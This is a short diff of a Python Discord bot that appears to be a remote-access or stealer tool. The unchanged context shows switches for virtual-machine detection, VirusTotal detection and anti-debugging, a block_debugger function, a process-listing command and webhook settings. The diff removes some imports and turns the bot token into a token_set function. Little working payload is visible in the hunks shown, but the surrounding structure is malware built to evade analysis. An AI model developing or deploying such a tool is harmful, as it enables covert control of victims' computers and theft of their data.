@@ -46,26 +46,17 @@ from discord_slash import SlashContext, SlashCommand
 from discord_slash.model import ButtonStyle
 from discord_slash.utils.manage_components import create_button, create_actionrow
 
-
-
-
-
 ## Auto Commands | leave here for now
 # from auto import *
-import pyautogui
-import shutil, os
 from Crypto.Cipher import AES
 from requests import get
-import os
 
 
-'''
-Input information
-'''
-token = 'DISCORD_BOT_TOKEN'
+
 webhook = 'DISCORD_WEBHOOK_URL'
 server_id = "DISCORD_SERVER_ID"
 g = [int(server_id)]
+
 
 
 '''
@@ -75,6 +66,7 @@ vmcheck_switch = True
 vtdetect_switch = True
 listcheck_switch = True
 anti_debug_switch = True
+
 
 #region Anti Debug
 def block_debugger():
@@ -1748,5 +1740,6 @@ async def listProccess_command(ctx: SlashContext):
 #endregion
 
 
-
-client.run(token)
+def token_set(str):
+    token = str
+    client.run(token)
